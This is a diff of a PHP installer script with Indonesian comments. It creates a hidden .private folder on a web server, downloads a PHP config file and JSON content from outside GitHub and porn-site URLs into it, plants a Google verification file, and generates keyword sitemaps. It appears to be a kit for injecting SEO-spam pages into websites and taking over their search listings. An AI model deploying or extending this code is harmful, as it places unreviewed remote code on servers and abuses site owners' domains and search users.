@@ -11,7 +11,8 @@ $host = $_SERVER['HTTP_HOST'] ?? 'default-domain.com';
 $clean_host = str_replace('www.', '', $host);
 
 // URL Download
-$config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php';
+// PENTING: Pastikan URL ini mengarah ke config.php ANDA yang sudah dimodifikasi
+$config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php'; 
 $google_html_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html'; 
 $base_keyword_url_path = 'https://player.javpornsub.net/keyword/';
 $base_content_url_path = 'https://player.javpornsub.net/content/';
@@ -19,6 +20,7 @@ $base_content_url_path = 'https://player.javpornsub.net/content/';
 // Path Penyimpanan
 $cache_dir = $server_path . '/.private';
 $local_config_path = $cache_dir . '/config.php';
+$local_json_content_path = $cache_dir . '/content.json'; // Path untuk JSON lokal
 $local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
 $local_robots_path = $server_path . '/robots.txt';
 $local_sitemap_path = $server_path . '/sitemap.xml'; 
@@ -84,9 +86,9 @@ function buat_robots_txt($domain) {
  * TAHAP 2: Dijalankan setelah form disubmit
  */
 function jalankan_instalasi() {
-    global $clean_host, $cache_dir, $server_path, $self_script_name,
+    global $clean_host, $server_path, $self_script_name,
            $config_url, $local_config_path, $base_keyword_url_path, $base_content_url_path,
-           $local_sitemap_path;
+           $local_sitemap_path, $local_json_content_path;
 
     // 1. Ambil input dari form
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file'])) || !isset($_GET['txt_file']) || empty(trim($_GET['txt_file']))) {
@@ -106,38 +108,42 @@ function jalankan_instalasi() {
         ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses instalasi...']
     ];
     
-    // 2. Unduh dan Modifikasi config.php
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh template config.php dari GitHub...'];
+    // 2. Unduh Konten JSON (Data)
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh file konten JSON dari: ' . htmlspecialchars($derived_content_url)];
+    $json_content = fetchRawUrl($derived_content_url);
+    
+    if ($json_content !== false && !empty($json_content)) {
+        if (@file_put_contents($local_json_content_path, $json_content)) {
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'File konten disimpan secara lokal di: .private/content.json'];
+        } else {
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan .private/content.json. Periksa izin folder.'];
+            tampilkan_log_terminal($logs, 'final_error');
+            return false;
+        }
+    } else {
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh file JSON dari URL. Proses dibatalkan.'];
+        tampilkan_log_terminal($logs, 'final_error');
+        return false;
+    }
+
+    // 3. Unduh config.php (Logika)
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php yang sudah dimodifikasi dari GitHub...'];
     $config_content = fetchRawUrl($config_url);
     
     if ($config_content !== false && !empty($config_content)) {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Template config.php berhasil diunduh.'];
-        
-        // Modifikasi 1: $content_url (berdasarkan input user)
-        $config_content_mod = preg_replace(
-            "/\\\$content_url = '.*';/i",
-            "\$content_url = " . var_export($derived_content_url, true) . ";",
-            $config_content
-        );
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Set $content_url ke: ' . htmlspecialchars($derived_content_url)];
-
-        // (Logika modifikasi User-Agent Dihapus sesuai permintaan)
-
-        // Simpan file config.php yang sudah dimodifikasi
-        if (@file_put_contents($local_config_path, $config_content_mod)) {
+        // Cukup simpan, tidak perlu modifikasi
+        if (@file_put_contents($local_config_path, $config_content)) {
             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan di: .private/config.php'];
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PENTING: Jangan lupa edit manual .private/config.php untuk User-Agent!'];
         } else {
              $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan config.php. Periksa izin folder .private.'];
         }
-
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh config.php. Proses dibatalkan.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh config.php. Periksa URL di $config_url.'];
         tampilkan_log_terminal($logs, 'final_error');
         return false;
     }
     
-    // 3. Buat robots.txt
+    // 4. Buat robots.txt
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat robots.txt...'];
     if (buat_robots_txt($clean_host)) {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt berhasil dibuat di root.'];
@@ -145,7 +151,7 @@ function jalankan_instalasi() {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat robots.txt.'];
     }
     
-    // 4. Buat Sitemap
+    // 5. Buat Sitemap
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh keywords dari: ' . htmlspecialchars($derived_keyword_url)];
     $keywords = fetchKeywordsFromUrl($derived_keyword_url, []);
     
@@ -162,7 +168,7 @@ function jalankan_instalasi() {
     $base_url = $protocol . $clean_host;
     $now = date('Y-m-d\TH:i:s+07:00');
     
-    $urls_per_map = 10000; // Batas 10rb URL per sitemap
+    $urls_per_map = 10000;
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengatur batas ' . $urls_per_map . ' URL per file sitemap.'];
 
     $num_maps = ceil($total_keywords / $urls_per_map);
@@ -177,8 +183,6 @@ function jalankan_instalasi() {
         $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
         $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
         
-        // (URL Homepage Dihapus dari sitemap turunan - Sesuai Permintaan 2)
-
         foreach ($keywords_chunk as $keyword) {
             $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword));
             $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
@@ -214,7 +218,6 @@ function tampilkan_halaman_installer() {
         ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mendeteksi domain: ' . $clean_host]
     ];
 
-    // (Alur Baru - Sesuai Permintaan 1)
     // 1. Buat folder .private
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memeriksa folder .private...'];
     if (!is_dir($cache_dir)) {
@@ -242,7 +245,6 @@ function tampilkan_halaman_installer() {
     } else {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh ' . $google_file_name . '.'];
     }
-    // --- (Akhir Alur Baru) ---
 
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Sistem siap. Menunggu input...'];
 
